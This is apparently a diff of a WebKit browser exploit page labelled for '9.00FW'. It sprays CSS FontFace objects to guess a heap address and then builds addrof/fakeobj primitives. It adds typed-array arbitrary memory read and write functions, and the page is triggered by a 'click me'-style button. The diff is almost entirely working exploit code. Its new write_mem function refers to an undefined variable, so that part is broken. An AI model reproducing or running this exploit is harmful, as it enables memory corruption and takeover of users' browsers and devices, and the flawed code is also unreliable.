@@ -1,10 +1,10 @@
 <script>
-var PAGE_SIZE = 4096;
-var SIZEOF_CSS_FONT_FACE = 200;
+var PAGE_SIZE = 16384;
+var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
 var STRING_OFFSET = 20;
 var SPRAY_FONTS = 0x1000;
-var GUESS_FONT = 0x7fffc381b000;
+var GUESS_FONT = 0x200430000;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
 var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
@@ -76,9 +76,16 @@ function mkString(l, head)
     return s;
 }
 
+var guf = GUESS_FONT;
+var ite = true;
+var matches = 0;
+
+do
+{
+
 var p_s = ptrToString(NPAGES+2); // vector.size()
 for(var i = 0; i < NPAGES; i++)
-    p_s += ptrToString(GUESS_FONT + i * PAGE_SIZE);
+    p_s += ptrToString(guf + i * PAGE_SIZE);
 p_s += ptrToString(INVALID_POINTER);
 
 for(var i = 0; i < 256; i++)
@@ -106,19 +113,24 @@ for(var i = 0; i < SPRAY_FONTS; i++)
                 break;
             }
         }
+        if(matches++ == 0)
+        {
+            guf = guessed_addr + 2 * PAGE_SIZE;
+            guessed_addr = null;
+        }
         break;
     }
 }
 
-if(badstr1.substr(0, p_s.length) == p_s)
-{
-    alert("failed to guess fontface addr");
-    return;
+if((ite = !ite))
+    guf += NPAGES * PAGE_SIZE;
+
 }
+while(guessed_addr === null);
 
 alert("guessed fontface addr: "+guessed_font+" -> "+hex(guessed_addr));
 
-p_s = '';
+var p_s = '';
 p_s += ptrToString(26);
 p_s += ptrToString(guessed_addr);
 p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
@@ -170,7 +182,7 @@ function makeReader(read_addr, ffs_name)
 var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr
 alert("fastmalloc.length = "+fastmalloc.length);
 
-for(var i = 0; i < 0x1000; i++)
+for(var i = 0; i < 100000; i++)
     mkString(128, '');
 
 var props = [];
@@ -287,6 +299,47 @@ window.fakeobj = function(addr)
 
 alert("addrof(null)="+addrof(null)+" fakeobj(10)="+fakeobj(10));
 
+//craft misaligned typedarray
+
+var arw_master = new Uint32Array(8);
+var arw_slave = new Uint8Array(1);
+
+var addrof_slave = addrof(arw_slave);
+union_i[0] = structureid_low;
+union_i[1] = structureid_high;
+union_b[6] = 7;
+var obj = {jscell: union_f[0], butterfly: true, buffer: arw_master, size: 0x5678};
+
+(function()
+{
+    var magic = fakeobj(addrof(obj) + 16);
+    magic[4] = addrof_slave;
+    magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
+    magic = null;
+})();
+
+window.read_mem = function(p, sz)
+{
+    arw_master[4] = p;
+    arw_master[5] = (p - p % 0x100000000) / 0x100000000;
+    arw_master[6] = sz;
+    var buf = [];
+    for(var i = 0; i < sz; i++)
+        buf.push(arw_slave[i]);
+    return buf;
+}
+
+window.write_mem = function(p, buf)
+{
+    arw_master[4] = p;
+    arw_master[5] = (p - p % 0x100000000) / 0x100000000;
+    arw_master[6] = buf.length;
+    for(var i = 0; i < sz; i++)
+        arw_slave[i] = buf[i];
+}
+
+alert(read_mem(addrof(obj), 48));
+
 }
 </script>
-<button onclick="try{poc()}catch(e){alert(e);}">click me</button>
+<button onclick="try{poc()}catch(e){alert(e);}">WebKit Exploit 9.00FW ONLY</button>
